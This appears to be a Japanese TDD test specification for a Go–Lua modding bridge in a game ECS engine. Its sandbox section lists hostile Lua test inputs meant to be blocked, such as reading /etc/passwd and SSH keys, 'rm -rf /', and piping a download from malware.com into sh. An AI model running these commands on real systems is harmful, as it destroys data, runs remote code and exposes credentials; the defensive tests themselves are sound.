# TASK-303: Lua Bridge実装 - テストケース仕様

## テスト戦略概要

**テスト方針**: Test-Driven Development (TDD) Red-Green-Refactor サイクル  
**テストレベル**: 単体テスト → 統合テスト → E2Eテスト  
**テストカバレッジ目標**: 95%以上  
**テストツール**: Go標準testing, testify/assert, gopher-lua  

## テストカテゴリ分類

### カテゴリ1: Data Conversion Tests (データ変換テスト)
**目的**: Go ↔ Lua 型変換の正確性・パフォーマンス検証  
**テスト数**: 24個  

### カテゴリ2: ECS API Wrapper Tests (ECS APIラッパーテスト)  
**目的**: Lua向けECS API の機能・権限制御検証  
**テスト数**: 32個

### カテゴリ3: Sandbox Security Tests (サンドボックスセキュリティテスト)
**目的**: セキュリティ制限・攻撃防御機能検証  
**テスト数**: 20個

### カテゴリ4: Resource Management Tests (リソース管理テスト)
**目的**: メモリ・時間制限・リソース解放検証  
**テスト数**: 16個

### カテゴリ5: Error Handling Tests (エラーハンドリングテスト)  
**目的**: 例外処理・エラー復旧・デバッグ支援検証  
**テスト数**: 18個

### カテゴリ6: Integration Tests (統合テスト)
**目的**: 複数コンポーネント連携・実MODシナリオ検証  
**テスト数**: 12個

**合計テスト数**: 122個

---

## カテゴリ1: Data Conversion Tests

### TC-DC-001: Go基本型 → Lua型変換テスト

**テスト目的**: Go基本型がLua型に正確に変換されることを確認  
**実行条件**: LuaBridgeインスタンス作成済み  

#### TC-DC-001-01: string変換テスト
```go
func TestGoToLua_String(t *testing.T) {
    bridge := NewLuaBridge()
    vm, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    testCases := []string{
        "hello world",
        "",
        "日本語テスト",
        "special chars: !@#$%^&*()",
        strings.Repeat("x", 10000), // 長い文字列
    }
    
    for _, testCase := range testCases {
        luaVal, err := bridge.GoToLua(vm, testCase)
        require.NoError(t, err)
        assert.Equal(t, lua.LTString, luaVal.Type())
        assert.Equal(t, testCase, luaVal.String())
    }
}
```

#### TC-DC-001-02: int変換テスト
```go
func TestGoToLua_Int(t *testing.T) {
    testCases := []int{0, 1, -1, math.MaxInt32, math.MinInt32, 42}
    // 実装: Go int → Lua number変換確認
}
```

#### TC-DC-001-03: float変換テスト
```go
func TestGoToLua_Float(t *testing.T) {
    testCases := []float64{0.0, 1.5, -1.5, math.Pi, math.Inf(1), math.NaN()}
    // 実装: Go float64 → Lua number変換確認
}
```

#### TC-DC-001-04: bool変換テスト
```go
func TestGoToLua_Bool(t *testing.T) {
    testCases := []bool{true, false}
    // 実装: Go bool → Lua boolean変換確認
}
```

### TC-DC-002: Lua型 → Go基本型変換テスト

#### TC-DC-002-01: Lua string → Go string変換テスト
```go
func TestLuaToGo_String(t *testing.T) {
    bridge := NewLuaBridge()
    vm, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    testCases := []string{
        "lua string",
        "",
        "Luaからの日本語", 
        "UTF-8 characters: 你好",
    }
    
    for _, testCase := range testCases {
        luaVal := lua.LString(testCase)
        var result string
        err := bridge.LuaToGo(vm, luaVal, &result)
        require.NoError(t, err)
        assert.Equal(t, testCase, result)
    }
}
```

### TC-DC-003: Goスライス ↔ Luaテーブル変換テスト

#### TC-DC-003-01: []string → Luaテーブル変換
```go
func TestGoSliceToLuaTable_String(t *testing.T) {
    slice := []string{"apple", "banana", "cherry"}
    // 実装: Goスライス→Luaテーブル（配列形式）変換
    // 検証: luaTable[1] == "apple", luaTable[2] == "banana"等
}
```

#### TC-DC-003-02: []int → Luaテーブル変換
```go
func TestGoSliceToLuaTable_Int(t *testing.T) {
    slice := []int{1, 2, 3, 4, 5}
    // 実装: []int→Luaテーブル変換確認
}
```

#### TC-DC-003-03: Luaテーブル → []string変換
```go
func TestLuaTableToGoSlice_String(t *testing.T) {
    // Luaコード実行: local t = {"apple", "banana", "cherry"}
    // 実装: Luaテーブル→Goスライス変換確認
}
```

### TC-DC-004: Goマップ ↔ Luaテーブル変換テスト

#### TC-DC-004-01: map[string]interface{} → Luaテーブル変換
```go
func TestGoMapToLuaTable(t *testing.T) {
    m := map[string]interface{}{
        "name": "Player1",
        "level": 42,
        "health": 100.5,
        "alive": true,
    }
    // 実装: Goマップ→Luaテーブル（ハッシュ形式）変換
}
```

### TC-DC-005: Go構造体 ↔ Luaテーブル変換テスト

#### TC-DC-005-01: 構造体 → Luaテーブル変換（Reflection使用）
```go
type TestStruct struct {
    Name   string  `json:"name"`
    Age    int     `json:"age"`
    Score  float64 `json:"score"`
    Active bool    `json:"active"`
}

func TestGoStructToLuaTable(t *testing.T) {
    s := TestStruct{
        Name: "TestPlayer",
        Age: 25,
        Score: 88.5,
        Active: true,
    }
    // 実装: Go構造体→Luaテーブル変換（フィールド名→キー）
}
```

### TC-DC-006: エラーケース・境界値テスト

#### TC-DC-006-01: 型不一致エラーテスト
```go
func TestDataConversion_TypeError(t *testing.T) {
    // nil値変換試行
    // unsupported型変換試行
    // 循環参照構造体変換試行
}
```

#### TC-DC-006-02: パフォーマンステスト
```go
func BenchmarkGoToLua_String(b *testing.B) {
    // 要件: <1ms for basic types
}

func BenchmarkLuaToGo_String(b *testing.B) {
    // 要件: <1ms for basic types  
}
```

---

## カテゴリ2: ECS API Wrapper Tests

### TC-API-001: EntityManager Lua API テスト

#### TC-API-001-01: ecs.create_entity() テスト
```go
func TestLuaAPI_CreateEntity(t *testing.T) {
    bridge := setupTestBridge(t)
    vm := setupTestVM(t, bridge)
    
    // Luaコード実行
    luaCode := `
        local entity = ecs.create_entity()
        assert(entity ~= nil)
        assert(type(entity) == "number")
        return entity
    `
    
    err := vm.DoString(luaCode)
    require.NoError(t, err)
    
    // Goサイドで検証
    result := vm.Get(-1)
    assert.Equal(t, lua.LTNumber, result.Type())
    entityID := EntityID(lua.LVAsNumber(result))
    assert.True(t, entityID > 0)
}
```

#### TC-API-001-02: ecs.destroy_entity() テスト
```go
func TestLuaAPI_DestroyEntity(t *testing.T) {
    luaCode := `
        local entity = ecs.create_entity()
        local success = ecs.destroy_entity(entity)
        assert(success == true)
        assert(ecs.entity_exists(entity) == false)
    `
    // 実装: エンティティ削除機能検証
}
```

#### TC-API-001-03: ecs.entity_exists() テスト
```go
func TestLuaAPI_EntityExists(t *testing.T) {
    luaCode := `
        local entity = ecs.create_entity()
        assert(ecs.entity_exists(entity) == true)
        ecs.destroy_entity(entity)
        assert(ecs.entity_exists(entity) == false)
    `
    // 実装: エンティティ存在確認機能検証
}
```

### TC-API-002: ComponentStore Lua API テスト

#### TC-API-002-01: ecs.add_component() テスト
```go
func TestLuaAPI_AddComponent(t *testing.T) {
    luaCode := `
        local entity = ecs.create_entity()
        
        -- Transform コンポーネント追加
        local success = ecs.add_component(entity, "Transform", {
            x = 10.5,
            y = 20.5, 
            z = 0.0
        })
        assert(success == true)
        assert(ecs.has_component(entity, "Transform") == true)
    `
    // 実装: コンポーネント追加機能検証
}
```

#### TC-API-002-02: ecs.get_component() テスト
```go
func TestLuaAPI_GetComponent(t *testing.T) {
    luaCode := `
        local entity = ecs.create_entity()
        ecs.add_component(entity, "Transform", {x=100, y=200, z=0})
        
        local transform = ecs.get_component(entity, "Transform")
        assert(transform ~= nil)
        assert(transform.x == 100)
        assert(transform.y == 200)
        assert(transform.z == 0)
    `
    // 実装: コンポーネント取得機能検証
}
```

#### TC-API-002-03: ecs.remove_component() テスト
```go
func TestLuaAPI_RemoveComponent(t *testing.T) {
    luaCode := `
        local entity = ecs.create_entity()
        ecs.add_component(entity, "Transform", {x=0, y=0, z=0})
        assert(ecs.has_component(entity, "Transform") == true)
        
        local success = ecs.remove_component(entity, "Transform")  
        assert(success == true)
        assert(ecs.has_component(entity, "Transform") == false)
    `
}
```

### TC-API-003: Query Engine Lua API テスト

#### TC-API-003-01: ecs.query() 基本テスト
```go
func TestLuaAPI_QueryBasic(t *testing.T) {
    luaCode := `
        -- テストエンティティ作成
        local entity1 = ecs.create_entity()
        ecs.add_component(entity1, "Transform", {x=10, y=10, z=0})
        ecs.add_component(entity1, "Sprite", {texture="player.png"})
        
        local entity2 = ecs.create_entity()
        ecs.add_component(entity2, "Transform", {x=20, y=20, z=0})
        
        -- Transform を持つエンティティをクエリ
        local entities = ecs.query()
            :with("Transform")
            :execute()
            
        assert(#entities == 2)
        assert(entities[1] == entity1 or entities[1] == entity2)
    `
}
```

#### TC-API-003-02: 複雑クエリテスト
```go
func TestLuaAPI_QueryComplex(t *testing.T) {
    luaCode := `
        -- Transform AND Sprite を持つエンティティのみ
        local entities = ecs.query()
            :with("Transform") 
            :with("Sprite")
            :without("Health")
            :execute()
            
        -- 結果検証
        for _, entity in pairs(entities) do
            assert(ecs.has_component(entity, "Transform"))
            assert(ecs.has_component(entity, "Sprite"))
            assert(not ecs.has_component(entity, "Health"))
        end
    `
}
```

### TC-API-004: Event System Lua API テスト

#### TC-API-004-01: ecs.fire_event() テスト
```go
func TestLuaAPI_FireEvent(t *testing.T) {
    luaCode := `
        local event_received = false
        local event_data = nil
        
        -- イベント購読
        ecs.subscribe("TestEvent", function(data)
            event_received = true
            event_data = data
        end)
        
        -- イベント発火
        ecs.fire_event("TestEvent", {message = "Hello World", value = 42})
        
        -- 検証
        assert(event_received == true)
        assert(event_data.message == "Hello World")
        assert(event_data.value == 42)
    `
}
```

### TC-API-005: API権限制御テスト

#### TC-API-005-01: 許可されたAPI呼び出しテスト
```go
func TestLuaAPI_AllowedAPICalls(t *testing.T) {
    // 権限設定: EntityManager APIのみ許可
    permissions := &APIPermissions{
        AllowedAPIs: []string{"create_entity", "destroy_entity", "entity_exists"},
    }
    
    vm := setupTestVMWithPermissions(t, bridge, permissions)
    
    luaCode := `
        local entity = ecs.create_entity()  -- 許可
        assert(entity ~= nil)
    `
    
    err := vm.DoString(luaCode)
    require.NoError(t, err)
}
```

#### TC-API-005-02: 禁止されたAPI呼び出しテスト
```go
func TestLuaAPI_ForbiddenAPICalls(t *testing.T) {
    // 権限設定: ComponentStore APIを禁止
    permissions := &APIPermissions{
        ForbiddenAPIs: []string{"add_component", "remove_component"},
    }
    
    vm := setupTestVMWithPermissions(t, bridge, permissions)
    
    luaCode := `
        local entity = ecs.create_entity()
        ecs.add_component(entity, "Transform", {})  -- 禁止、エラーになるべき
    `
    
    err := vm.DoString(luaCode)
    require.Error(t, err)
    assert.Contains(t, err.Error(), "permission denied")
}
```

---

## カテゴリ3: Sandbox Security Tests

### TC-SEC-001: ファイルアクセス制限テスト

#### TC-SEC-001-01: ローカルファイル読み取り攻撃防御
```go
func TestSandbox_FileReadAttack(t *testing.T) {
    vm := setupSandboxedVM(t)
    
    attackCodes := []string{
        `local file = io.open("/etc/passwd", "r")`,
        `local content = io.input("/home/user/.ssh/id_rsa"):read("*all")`,
        `dofile("/etc/shadow")`,
        `loadfile("../../../config/secret.yaml")()`,
    }
    
    for _, attackCode := range attackCodes {
        err := vm.DoString(attackCode)
        require.Error(t, err, "Attack should be blocked: %s", attackCode)
        assert.Contains(t, err.Error(), "file access denied")
    }
}
```

#### TC-SEC-001-02: ファイル書き込み攻撃防御
```go
func TestSandbox_FileWriteAttack(t *testing.T) {
    attackCodes := []string{
        `io.output("/tmp/malware.sh"):write("rm -rf /")`,
        `local f = io.open("/var/log/system.log", "w")`,
        `os.rename("safe.txt", "/etc/hosts")`,
    }
    
    for _, attackCode := range attackCodes {
        err := vm.DoString(attackCode)
        require.Error(t, err)
        assert.Contains(t, err.Error(), "file access denied")
    }
}
```

### TC-SEC-002: システムコマンド実行攻撃防御

#### TC-SEC-002-01: os.execute() 攻撃防御
```go
func TestSandbox_OSExecuteAttack(t *testing.T) {
    attackCodes := []string{
        `os.execute("rm -rf /")`,
        `os.execute("curl malware.com/download | sh")`,
        `os.execute("cat /etc/passwd")`,
        `os.execute("netcat -l 1337")`,
    }
    
    for _, attackCode := range attackCodes {
        err := vm.DoString(attackCode)
        require.Error(t, err)
        assert.Contains(t, err.Error(), "os.execute not available")
    }
}
```

#### TC-SEC-002-02: io.popen() 攻撃防御
```go
func TestSandbox_IOPopenAttack(t *testing.T) {
    attackCodes := []string{
        `local p = io.popen("ls -la /")`,
        `io.popen("whoami"):read()`,
    }
    
    for _, attackCode := range attackCodes {
        err := vm.DoString(attackCode)
        require.Error(t, err)
        assert.Contains(t, err.Error(), "io.popen not available")
    }
}
```

### TC-SEC-003: ネットワークアクセス制限テスト

#### TC-SEC-003-01: HTTP/Socket攻撃防御
```go
func TestSandbox_NetworkAttack(t *testing.T) {
    // Note: gopher-lua doesn't have built-in network libraries,
    // but we test to ensure no network libraries are accidentally exposed
    
    networkCodes := []string{
        `require("socket")`,
        `require("http")`, 
        `require("net")`,
    }
    
    for _, code := range networkCodes {
        err := vm.DoString(code)
        require.Error(t, err)
        assert.Contains(t, err.Error(), "module not found")
    }
}
```

### TC-SEC-004: メモリボム攻撃防御

#### TC-SEC-004-01: メモリ大量消費攻撃
```go
func TestSandbox_MemoryBombAttack(t *testing.T) {
    vm := setupSandboxedVMWithLimits(t, &ResourceLimits{
        MaxMemoryUsage: 10 * 1024 * 1024, // 10MB
    })
    
    memoryBombCode := `
        local huge_table = {}
        for i=1,1000000 do 
            huge_table[i] = string.rep("x", 10000)  -- 10MB+ allocation attempt
        end
    `
    
    err := vm.DoString(memoryBombCode)
    require.Error(t, err)
    assert.Contains(t, err.Error(), "memory limit exceeded")
}
```

### TC-SEC-005: 無限ループ攻撃防御

#### TC-SEC-005-01: CPU消費攻撃
```go
func TestSandbox_InfiniteLoopAttack(t *testing.T) {
    vm := setupSandboxedVMWithLimits(t, &ResourceLimits{
        MaxExecutionTime: 100 * time.Millisecond,
    })
    
    infiniteLoopCode := `
        while true do
            -- infinite loop attack
        end
    `
    
    start := time.Now()
    err := vm.DoString(infiniteLoopCode)
    elapsed := time.Since(start)
    
    require.Error(t, err)
    assert.Contains(t, err.Error(), "execution timeout")
    assert.Less(t, elapsed, 150*time.Millisecond) // Some buffer for overhead
}
```

---

## カテゴリ4: Resource Management Tests

### TC-RES-001: メモリ管理テスト

#### TC-RES-001-01: VM作成・削除テスト
```go
func TestResourceManagement_VMCreationDestruction(t *testing.T) {
    bridge := NewLuaBridge()
    
    // 複数VM作成・削除
    for i := 0; i < 100; i++ {
        vm, err := bridge.CreateVM(&LuaVMConfig{})
        require.NoError(t, err)
        
        // 簡単な処理実行
        err = vm.DoString("local x = 42")
        require.NoError(t, err)
        
        err = bridge.DestroyVM(vm)
        require.NoError(t, err)
    }
    
    // メモリリークチェック（runtime.GC後のメモリ使用量確認）
}
```

#### TC-RES-001-02: スクリプトロード・アンロードテスト
```go
func TestResourceManagement_ScriptLoadUnload(t *testing.T) {
    bridge := NewLuaBridge()
    vm, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    // スクリプトの動的ロード・アンロード繰り返し
    for i := 0; i < 50; i++ {
        script, err := bridge.LoadScript(vm, "test_script.lua")
        require.NoError(t, err)
        
        err = bridge.ExecuteScript(vm, script)
        require.NoError(t, err)
        
        err = bridge.UnloadScript(vm, script)
        require.NoError(t, err)
    }
}
```

### TC-RES-002: リソース制限テスト

#### TC-RES-002-01: 実行時間制限テスト
```go
func TestResourceLimits_ExecutionTime(t *testing.T) {
    limits := &ResourceLimits{
        MaxExecutionTime: 50 * time.Millisecond,
    }
    
    vm := setupSandboxedVMWithLimits(t, limits)
    
    // 時間のかかる処理
    slowCode := `
        local sum = 0
        for i=1,10000000 do  -- Heavy computation
            sum = sum + i
        end
        return sum
    `
    
    start := time.Now()
    err := vm.DoString(slowCode)
    elapsed := time.Since(start)
    
    require.Error(t, err)
    assert.Contains(t, err.Error(), "execution timeout")
    assert.Less(t, elapsed, 100*time.Millisecond)
}
```

#### TC-RES-002-02: メモリ制限テスト
```go
func TestResourceLimits_Memory(t *testing.T) {
    limits := &ResourceLimits{
        MaxMemoryUsage: 5 * 1024 * 1024, // 5MB
    }
    
    vm := setupSandboxedVMWithLimits(t, limits)
    
    bigDataCode := `
        local big_table = {}
        for i=1,1000 do
            big_table[i] = string.rep("data", 10000)  -- Attempt to use >5MB
        end
    `
    
    err := vm.DoString(bigDataCode)
    require.Error(t, err)
    assert.Contains(t, err.Error(), "memory limit exceeded")
}
```

### TC-RES-003: 長期実行安定性テスト

#### TC-RES-003-01: 24時間メモリリークテスト
```go
func TestResourceManagement_LongRunMemoryLeak(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping long-running test")
    }
    
    bridge := NewLuaBridge()
    vm, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    startMem := getMemoryUsage()
    
    // 24時間相当の処理を圧縮実行
    for i := 0; i < 86400; i++ { // 1 second per iteration
        if i%1000 == 0 {
            runtime.GC() // Periodic GC
            currentMem := getMemoryUsage()
            memIncrease := currentMem - startMem
            
            // 1MB以上のメモリ増加でリーク判定
            assert.Less(t, memIncrease, int64(1024*1024), 
                "Memory leak detected at iteration %d: %d bytes", i, memIncrease)
        }
        
        err := vm.DoString("local temp = {1,2,3,4,5}")
        require.NoError(t, err)
    }
}
```

---

## カテゴリ5: Error Handling Tests

### TC-ERR-001: Lua構文エラーハンドリング

#### TC-ERR-001-01: 構文エラー検出テスト
```go
func TestErrorHandling_SyntaxError(t *testing.T) {
    vm := setupTestVM(t)
    
    syntaxErrors := []string{
        `local x = `,           // Incomplete assignment
        `if true then`,         // Missing end
        `function test()`,      // Missing end
        `local x = 1 + + 2`,   // Invalid operator
        `"unclosed string`,     // Unclosed string
    }
    
    for _, errorCode := range syntaxErrors {
        err := vm.DoString(errorCode)
        require.Error(t, err)
        
        // Error should contain useful information
        assert.Contains(t, err.Error(), "syntax error")
        
        // VM should still be functional after error
        err = vm.DoString("local x = 42")
        require.NoError(t, err)
    }
}
```

#### TC-ERR-001-02: スタックトレース取得テスト
```go
func TestErrorHandling_StackTrace(t *testing.T) {
    vm := setupTestVM(t)
    
    errorCode := `
        function level3()
            error("test error")
        end
        
        function level2()  
            level3()
        end
        
        function level1()
            level2()
        end
        
        level1()
    `
    
    err := vm.DoString(errorCode)
    require.Error(t, err)
    
    // Should contain stack trace information
    assert.Contains(t, err.Error(), "level1")
    assert.Contains(t, err.Error(), "level2")
    assert.Contains(t, err.Error(), "level3")
    assert.Contains(t, err.Error(), "test error")
}
```

### TC-ERR-002: ECS APIエラーハンドリング

#### TC-ERR-002-01: 無効EntityIDエラー
```go
func TestErrorHandling_InvalidEntityID(t *testing.T) {
    vm := setupTestVM(t)
    
    errorCode := `
        local invalid_entity = -1
        local success = ecs.add_component(invalid_entity, "Transform", {})
        assert(success == false)  -- Should return false, not crash
    `
    
    err := vm.DoString(errorCode)
    require.NoError(t, err) // Should handle gracefully
}
```

#### TC-ERR-002-02: 存在しないコンポーネントエラー
```go
func TestErrorHandling_NonExistentComponent(t *testing.T) {
    vm := setupTestVM(t)
    
    errorCode := `
        local entity = ecs.create_entity()
        local component = ecs.get_component(entity, "NonExistentComponent")
        assert(component == nil)  -- Should return nil, not crash
    `
    
    err := vm.DoString(errorCode)
    require.NoError(t, err)
}
```

### TC-ERR-003: エラー回復・継続実行テスト

#### TC-ERR-003-01: 部分的エラー後の実行継続
```go
func TestErrorHandling_RecoveryAfterError(t *testing.T) {
    vm := setupTestVM(t)
    
    // First script with error
    errorCode := `error("intentional error")`
    err := vm.DoString(errorCode)
    require.Error(t, err)
    
    // Second script should still work
    validCode := `
        local entity = ecs.create_entity()
        return entity
    `
    err = vm.DoString(validCode)
    require.NoError(t, err)
    
    result := vm.Get(-1)
    assert.Equal(t, lua.LTNumber, result.Type())
}
```

### TC-ERR-004: デバッグ情報出力テスト

#### TC-ERR-004-01: 構造化エラーログ出力
```go
func TestErrorHandling_StructuredErrorLog(t *testing.T) {
    vm := setupTestVMWithErrorHandler(t)
    
    errorCode := `
        local function problematic_function()
            error("detailed error message")
        end
        problematic_function()
    `
    
    err := vm.DoString(errorCode)
    require.Error(t, err)
    
    // Error should be structured (JSON format)
    var errorInfo map[string]interface{}
    err = json.Unmarshal([]byte(err.Error()), &errorInfo)
    require.NoError(t, err)
    
    assert.Equal(t, "lua_error", errorInfo["type"])
    assert.Contains(t, errorInfo["message"], "detailed error message")
    assert.NotEmpty(t, errorInfo["stack_trace"])
    assert.NotEmpty(t, errorInfo["timestamp"])
}
```

---

## カテゴリ6: Integration Tests

### TC-INT-001: MOD統合シナリオテスト

#### TC-INT-001-01: ゾンビMODシナリオテスト
```go
func TestIntegration_ZombieMODScenario(t *testing.T) {
    // 実際のMODシナリオをシミュレート
    bridge := NewLuaBridge()
    vm, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    // Register ECS API
    ecsAPI := setupMockECSAPI(t)
    err = bridge.RegisterECSAPI(vm, ecsAPI)
    require.NoError(t, err)
    
    zombieModCode := `
        -- Zombie MOD simulation
        function spawn_zombie(x, y)
            local zombie = ecs.create_entity()
            ecs.add_component(zombie, "Transform", {x=x, y=y, z=0})
            ecs.add_component(zombie, "Sprite", {texture="zombie.png"})
            ecs.add_component(zombie, "Health", {max=50, current=50})
            ecs.add_component(zombie, "AI", {behavior="chase_player"})
            return zombie
        end
        
        function zombie_attack(zombie_entity, target_entity) 
            local zombie_transform = ecs.get_component(zombie_entity, "Transform")
            local target_transform = ecs.get_component(target_entity, "Transform")
            
            if distance(zombie_transform, target_transform) < 30 then
                ecs.fire_event("ZombieAttack", {
                    attacker = zombie_entity,
                    target = target_entity,
                    damage = 10
                })
                return true
            end
            return false
        end
        
        -- Test scenario execution
        local zombie = spawn_zombie(100, 200)
        local player = ecs.create_entity()
        ecs.add_component(player, "Transform", {x=110, y=210, z=0})
        
        local attack_result = zombie_attack(zombie, player)
        assert(attack_result == true)  -- Should be in range
        
        return {zombie = zombie, player = player}
    `
    
    err = vm.DoString(zombieModCode)
    require.NoError(t, err)
    
    // Verify results
    result := vm.Get(-1)
    assert.Equal(t, lua.LTTable, result.Type())
}
```

#### TC-INT-001-02: マルチMOD相互作用テスト
```go
func TestIntegration_MultiMODInteraction(t *testing.T) {
    // 複数MODの同時実行・相互作用テスト
    bridge := NewLuaBridge()
    
    // MOD1: Weather System
    vm1, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm1)
    
    // MOD2: Day/Night Cycle
    vm2, err := bridge.CreateVM(&LuaVMConfig{})
    require.NoError(t, err)
    defer bridge.DestroyVM(vm2)
    
    weatherCode := `
        function set_weather(type)
            ecs.fire_event("WeatherChange", {weather = type})
        end
        
        ecs.subscribe("TimeChange", function(data)
            if data.time == "night" then
                set_weather("rain")
            end
        end)
    `
    
    dayNightCode := `
        local time = "day"
        
        function advance_time()
            time = time == "day" and "night" or "day"
            ecs.fire_event("TimeChange", {time = time})
        end
        
        advance_time()  -- Trigger night -> should cause rain
    `
    
    // Execute both MODs
    err = vm1.DoString(weatherCode)
    require.NoError(t, err)
    
    err = vm2.DoString(dayNightCode)
    require.NoError(t, err)
    
    // Verify event propagation between MODs worked correctly
}
```

### TC-INT-002: パフォーマンス統合テスト

#### TC-INT-002-01: 大量エンティティ処理テスト
```go
func TestIntegration_LargeScaleEntityProcessing(t *testing.T) {
    vm := setupTestVM(t)
    
    massEntityCode := `
        local entities = {}
        local start_time = os.clock()
        
        -- Create 1000 entities with components
        for i=1,1000 do
            local entity = ecs.create_entity()
            ecs.add_component(entity, "Transform", {
                x = math.random(0, 1000),
                y = math.random(0, 1000), 
                z = 0
            })
            ecs.add_component(entity, "Sprite", {texture = "sprite_" .. i .. ".png"})
            entities[i] = entity
        end
        
        -- Query all entities
        local queried = ecs.query():with("Transform"):with("Sprite"):execute()
        assert(#queried == 1000)
        
        local end_time = os.clock()
        return {
            entity_count = #entities,
            query_count = #queried,
            processing_time = end_time - start_time
        }
    `
    
    start := time.Now()
    err := vm.DoString(massEntityCode)
    goProcessingTime := time.Since(start)
    
    require.NoError(t, err)
    
    // Verify performance requirements
    assert.Less(t, goProcessingTime, 100*time.Millisecond, 
        "Large scale processing took too long: %v", goProcessingTime)
        
    result := vm.Get(-1)
    assert.Equal(t, lua.LTTable, result.Type())
}
```

#### TC-INT-002-02: 並列スクリプト実行テスト
```go
func TestIntegration_ParallelScriptExecution(t *testing.T) {
    const numGoroutines = 10
    const scriptIterations = 100
    
    bridge := NewLuaBridge()
    
    var wg sync.WaitGroup
    errors := make(chan error, numGoroutines)
    
    for i := 0; i < numGoroutines; i++ {
        wg.Add(1)
        go func(routineID int) {
            defer wg.Done()
            
            vm, err := bridge.CreateVM(&LuaVMConfig{})
            if err != nil {
                errors <- err
                return
            }
            defer bridge.DestroyVM(vm)
            
            for j := 0; j < scriptIterations; j++ {
                script := fmt.Sprintf(`
                    local entity = ecs.create_entity()
                    ecs.add_component(entity, "Transform", {x=%d, y=%d, z=0})
                    return entity
                `, routineID, j)
                
                err := vm.DoString(script)
                if err != nil {
                    errors <- err
                    return
                }
            }
        }(i)
    }
    
    wg.Wait()
    close(errors)
    
    // Check for any errors
    for err := range errors {
        require.NoError(t, err)
    }
}
```

---

## テスト実行計画

### Phase 1: 基本機能テスト (Day 1)
```bash
# Data Conversion Tests実行
go test -v ./internal/core/ecs/lua/... -run="TestGoToLua|TestLuaToGo"

# 期待結果: 24/24 tests pass, カバレッジ>90%
```

### Phase 2: API機能テスト (Day 2)
```bash  
# ECS API Wrapper Tests実行
go test -v ./internal/core/ecs/lua/... -run="TestLuaAPI"

# 期待結果: 32/32 tests pass, API機能100%動作確認
```

### Phase 3: セキュリティテスト (Day 3)
```bash
# Sandbox Security Tests実行
go test -v ./internal/core/ecs/lua/... -run="TestSandbox|TestSecurity"

# 期待結果: 20/20 tests pass, 全攻撃パターン防御確認
```

### Phase 4: 統合・パフォーマンステスト (Day 4)
```bash
# Integration & Performance Tests実行
go test -v ./internal/core/ecs/lua/... -run="TestIntegration"
go test -bench=. -benchmem ./internal/core/ecs/lua/...

# 期待結果: 全統合テスト通過、パフォーマンス要件達成
```

## 品質ゲートクライテリア

### 必須通過条件
- [ ] **全テスト通過**: 122/122 tests pass
- [ ] **テストカバレッジ**: 95%以上
- [ ] **パフォーマンス要件**: データ変換<1ms, スクリプト実行オーバーヘッド<10%
- [ ] **セキュリティ要件**: 既知攻撃パターン100%防御
- [ ] **安定性要件**: 24時間実行メモリリーク<1MB

### 品質メトリクス監視
- **テスト実行時間**: 全テストスイート<5分
- **メモリ使用量**: テスト実行中<100MB
- **並列実行安全性**: 10並列実行でデータ競合0件
- **エラー処理完全性**: 予期されるエラーパターン100%カバー

---

**テストケース仕様完了**: 122個の詳細なテストケースが定義されました。次にRed段階（失敗するテスト実装）に進みます。